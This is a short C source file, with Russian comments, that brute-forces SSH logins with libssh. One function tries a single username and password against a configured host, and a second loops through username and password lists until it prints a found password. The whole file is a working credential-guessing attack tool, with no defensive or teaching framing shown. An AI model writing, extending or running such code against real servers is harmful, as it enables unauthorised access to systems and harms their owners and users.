#include "include/includes.h"

int try_login(const char *host, const char *user, const char *password) {
    ssh_session session = ssh_new();
    if (session == NULL) {
        fprintf(stderr, "Error: Unable to create SSH session\n");
        return -1;
    }

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_USER, user);

    printf("Connecting to %s as %s...\n", host, user);
    if (ssh_connect(session) != SSH_OK) {
        fprintf(stderr, "Error: %s\n", ssh_get_error(session));
        ssh_free(session);
        return -1;
    }

    printf("Trying password: %s\n", password);
    int rc = ssh_userauth_password(session, NULL, password);
    if (rc == SSH_AUTH_SUCCESS) {
        printf("Password found: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при успешном входе
        ssh_free(session);
        return 0; // Успех
    } else {
        printf("Failed password: %s\n", password);
        ssh_disconnect(session); // Разрываем соединение при неудаче
        ssh_free(session);
        return -1; // Неудача
    }
}



int ssh_brute() {
    int shutup_ssh_bruteforce;

    for (int b = 0; usernames[b] != NULL; b++){
        for (int i = 0; passwords[i] != NULL; i++) {
            if (try_login(SSH_HOST, usernames[b], passwords[i]) == 0) {
                shutup_ssh_bruteforce = 20;
                break; // Если пароль найден, выходим из цикла
            }
        }

        if (shutup_ssh_bruteforce == 20) {
            shutup_ssh_bruteforce = 0;
            break;
        }

    }
    return 0;
}
